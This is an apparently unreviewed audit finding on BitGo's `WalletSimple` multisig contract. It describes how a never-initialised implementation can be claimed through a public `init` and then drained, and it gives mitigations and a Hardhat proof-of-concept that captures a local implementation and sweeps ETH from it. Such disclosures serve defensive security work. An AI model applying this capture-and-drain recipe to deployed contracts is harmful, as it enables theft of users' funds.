# WalletSimple Implementation Capture via Public Init
**#H-08**
- Severity: High
- Validity: Unreviewed

## Affected Scope

This finding is scoped to `WalletSimple.sol`, specifically:

- `init(address[] allowedSigners)`
- the standalone implementation contract deployed by `scripts/deploy.ts` before the factory is wired up

It is not a duplicate of the already-reported `RecoveryWalletSimple` implementation-capture class. The issue here is that the live `WalletSimple` implementation deployed for clone factory use is itself callable by any external EOA and its post-capture privilege surface is broader (full 2-of-N multisig execution over any assets mis-routed to the implementation address), not just a single-signer sweep.

## Description

`WalletSimple` is the implementation contract referenced by `WalletFactory` when it deploys EIP-1167 minimal-proxy clones. The deployment pipeline publishes the implementation as a normal live contract with no constructor and no self-initialization step. The factory then wires clones to that implementation address.

Because the implementation contract has its own storage and its `init` function is `external onlyUninitialized`, the first external caller to reach the implementation directly (bypassing the factory) can set three arbitrary signer addresses on the implementation's own state:

```solidity
function init(address[] calldata allowedSigners) external onlyUninitialized {
  require(allowedSigners.length == 3, 'Invalid number of signers');

  for (uint8 i = 0; i < allowedSigners.length; i++) {
    require(allowedSigners[i] != address(0), 'Invalid signer');
    signers[allowedSigners[i]] = true;
  }

  initialized = true;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/WalletSimple.sol#L78-L87

The guard used by `init`:

```solidity
modifier onlyUninitialized() {
  require(!initialized, 'Contract already initialized');
  _;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/WalletSimple.sol#L136-L139

The factory only initializes the clone, not the implementation:

```solidity
function createWallet(address[] calldata allowedSigners, bytes32 salt) external {
  // include the signers in the salt so any changes to the allowed signers would result in a different address
  bytes32 finalSalt = keccak256(abi.encodePacked(allowedSigners, salt));

  address payable clone = createClone(implementationAddress, finalSalt);
  WalletSimple(clone).init(allowedSigners);
  emit WalletCreated(clone, allowedSigners);
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/WalletFactory.sol#L15-L24

The deployment script explicitly deploys the implementation standalone and verifies it, without ever calling `init`:

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/scripts/deploy.ts#L162-L245

The dangerous step is not the existence of a public initializer by itself, and it is not the existence of a standalone implementation by itself. The issue only appears when both are composed: a live, externally-callable implementation whose one-shot initializer is never claimed by the legitimate deployer, so any external caller gets to claim it first.

Once captured, the implementation's signer mapping points to attacker-controlled addresses. Any ETH, ERC20, ERC721, or ERC1155 later mis-routed to the implementation address can be swept with a normal `sendMultiSig` / `sendMultiSigToken` / `sendMultiSigBatch` flow because the attacker now satisfies both the `onlySigner` caller gate and the ecrecover co-signer check.

EIP-1167 clones are unaffected because the clone bytecode pins the implementation address and clones keep their own storage. The exposure is specifically the implementation's own balance surface.

## Root Cause

The root cause is that `init` is `external` and the deployment pipeline does not self-initialize the implementation to a neutral state. Any value routed to the implementation address (a common operational mistake: naive flows that confuse the implementation and the clone, or off-chain tools that approve/fund the implementation) can later be spent under a signer set chosen by the first external caller.

The critical composition is:

```solidity
function init(address[] calldata allowedSigners) external onlyUninitialized {
  ...
  for (uint8 i = 0; i < allowedSigners.length; i++) {
    require(allowedSigners[i] != address(0), 'Invalid signer');
    signers[allowedSigners[i]] = true;
  }

  initialized = true;
}
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/WalletSimple.sol#L78-L87

combined with:

```solidity
require(signers[msg.sender], 'Non-signer in onlySigner method');
```

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/contracts/WalletSimple.sol#L128-L130

and the deploy script never initializing the live implementation:

Permalink: https://github.com/BitGo/eth-multisig-v4/blob/75fd540d9e4b7601435c3dcdb7302174a769d42a/scripts/deploy.ts#L162-L245

## Impact

Any ETH, ERC20, ERC721, or ERC1155 balance that ever lands at the `WalletSimple` implementation address after deployment can be drained by whoever first called `init`. This is a live unauthorized-custody primitive on top of the canonical implementation address, which is an address that operational tooling, block explorers, and users treat as "the BitGo WalletSimple contract" rather than as an empty template.

TVL-at-risk growth model: for every ETH `e` or token balance `b` routed to the implementation address over time (misrouted airdrops, test-deposit confirmations, accidental approvals to the implementation rather than the clone), the attacker drains the full `e + b`. The exposure is additive across the implementation's entire operational lifetime because the attacker's capture is permanent (`initialized` is one-way).

This hits the program's High tier as an unauthorized-transfer/locked-funds class on the implementation's own state, orthogonal to the trusted-owner assumption in Scope.md which applies to factory-issued clones, not the implementation template.

## Recommended Mitigation

- Initialize the implementation contract atomically in its constructor so `initialized = true` from deploy time.
- Alternatively, expose a deploy-time initializer that the deploy script calls with burn-address signers before the contract is considered live.
- Add a regression test that attempts to call `init` on the deployed implementation and asserts it must revert.
- Document that clone deployers must only interact with clones and must never route value or approvals to the implementation address.

## Proof of Concept

### Test Code Path

### c3-walletsimple-impl-capture.poc.js (D:\eth-multisig-v4\test\poc\c3-walletsimple-impl-capture.poc.js)

```js
const { expect } = require('chai');
const { ethers } = require('hardhat');
const util = require('ethereumjs-util');

const helpers = require('../helpers');

// C3: WalletSimple implementation contract is deployed standalone by the
// deployment pipeline (see scripts/deploy.ts:162-245) and never self-initialized.
// Anyone can call init([...]) on the implementation address to become a signer
// of the IMPLEMENTATION INSTANCE. If ETH / ERC20 is later routed to that
// implementation address by an operational mistake, off-chain indexer
// mis-routing, or naive "approve the implementation" flow, the attacker can
// drain it via sendMultiSig with another signed op.
//
// Clones created through the factory are UNAFFECTED because EIP-1167 hardcodes
// the implementation address in bytecode and each clone keeps its own storage.
// The vulnerability is specifically about the standalone implementation's own
// balance / allowance surface.
//
// Root cause:
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\WalletSimple.sol:78-87
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\contracts\WalletSimple.sol:136-138
//   D:\FuckAudit\Bitgo\Bitgo codebase\eth-multisig-v4\scripts\deploy.ts:162-245  (no init on impl)

describe('PoC C3: WalletSimple implementation capture via public init()', function () {
  let WalletSimple;
  let deployer, attackerA, attackerB, victim, recipient;

  const signNative = ({ prefix, to, amount, data, expireTime, sequenceId, signerAddress }) => {
    const operationHash = helpers.getSha3ForConfirmationTx(
      prefix,
      to,
      amount.toString(),
      data,
      expireTime,
      sequenceId
    );
    const sig = util.ecsign(
      Buffer.from(operationHash.slice(2), 'hex'),
      helpers.privateKeyForAccount(signerAddress)
    );
    return helpers.serializeSignature(sig);
  };

  before(async () => {
    [deployer, attackerA, attackerB, victim, recipient] = await ethers.getSigners();
    WalletSimple = await ethers.getContractFactory('WalletSimple');
  });

  it('lets the first external caller initialize the standalone implementation as signers', async () => {
    const implementation = await WalletSimple.deploy();
    await implementation.waitForDeployment();
    const implementationAddress = await implementation.getAddress();

    // Prior to capture, no signer is registered.
    expect(await implementation.initialized()).to.equal(false);

    // Attacker first-inits the live implementation with their own signer set.
    // Scope.md OOS mentions "Wallet signer uniqueness or signer array validation"
    // — this PoC does not rely on duplicate/invalid signers. All three are
    // distinct attacker-controlled EOAs. The vulnerability is the missing
    // init-on-deploy in the deployment pipeline.
    await implementation
      .connect(attackerA)
      .init([attackerA.address, attackerB.address, deployer.address]);

    expect(await implementation.initialized()).to.equal(true);
    expect(await implementation.signers(attackerA.address)).to.equal(true);
    expect(await implementation.signers(attackerB.address)).to.equal(true);

    // No second init is possible.
    await expect(
      implementation.connect(victim).init([victim.address, recipient.address, deployer.address])
    ).to.be.revertedWith('Contract already initialized');
  });

  it('drains ETH mis-sent to the captured implementation address', async () => {
    const implementation = await WalletSimple.deploy();
    await implementation.waitForDeployment();
    const implementationAddress = await implementation.getAddress();

    // Attacker captures the impl.
    await implementation
      .connect(attackerA)
      .init([attackerA.address, attackerB.address, deployer.address]);

    // Victim (off-chain system, bridge, or naive user) routes ETH to the
    // implementation address thinking it is the deployable wallet template.
    await victim.sendTransaction({
      to: implementationAddress,
      value: ethers.parseEther('3')
    });
    expect(await ethers.provider.getBalance(implementationAddress)).to.equal(
      ethers.parseEther('3')
    );

    // Attacker drains via standard sendMultiSig with both attacker-controlled signers.
    const chainId = BigInt(await ethers.provider.send('eth_chainId', [])).toString();
    const expireTime = Math.floor(Date.now() / 1000) + 7200;
    const sequenceId = Number(await implementation.getNextSequenceId());
    const amount = ethers.parseEther('3');

    const signature = signNative({
      prefix: chainId,
      to: recipient.address,
      amount,
      data: '0x',
      expireTime,
      sequenceId,
      signerAddress: attackerB.address
    });

    await expect(
      implementation
        .connect(attackerA)
        .sendMultiSig(recipient.address, amount, '0x', expireTime, sequenceId, signature)
    ).to.changeEtherBalances(
      [implementation, recipient],
      [-amount, amount]
    );

    expect(await ethers.provider.getBalance(implementationAddress)).to.equal(0n);
  });

  it('confirms factory-created clones are UNAFFECTED by implementation capture', async () => {
    // Deploy a captured implementation.
    const implementation = await WalletSimple.deploy();
    await implementation.waitForDeployment();
    await implementation
      .connect(attackerA)
      .init([attackerA.address, attackerB.address, deployer.address]);

    // Now build a factory around that captured implementation and create a clone
    // with a LEGITIMATE signer set. The clone must carry its own storage.
    const WalletFactory = await ethers.getContractFactory('WalletFactory');
    const factory = await WalletFactory.deploy(await implementation.getAddress());
    await factory.waitForDeployment();

    const legitimateSigners = [deployer.address, victim.address, recipient.address];
    const salt = ethers.encodeBytes32String('legit');
    const tx = await factory.createWallet(legitimateSigners, salt);
    const receipt = await tx.wait();
    const event = receipt.logs.find((log) => {
      try {
        const p = factory.interface.parseLog(log);
        return p?.name === 'WalletCreated';
      } catch {
        return false;
      }
    });
    const cloneAddress = factory.interface.parseLog(event).args.newWalletAddress;
    const clone = WalletSimple.attach(cloneAddress);

    // Clone has the legitimate signer set, not the attacker's.
    expect(await clone.signers(deployer.address)).to.equal(true);
    expect(await clone.signers(attackerA.address)).to.equal(false);
    expect(await clone.signers(attackerB.address)).to.equal(false);

    // And the clone's initialized flag is true (cannot be re-init-ed).
    expect(await clone.initialized()).to.equal(true);
    await expect(
      clone.connect(attackerA).init([attackerA.address, attackerB.address, deployer.address])
    ).to.be.revertedWith('Contract already initialized');
  });
});
```
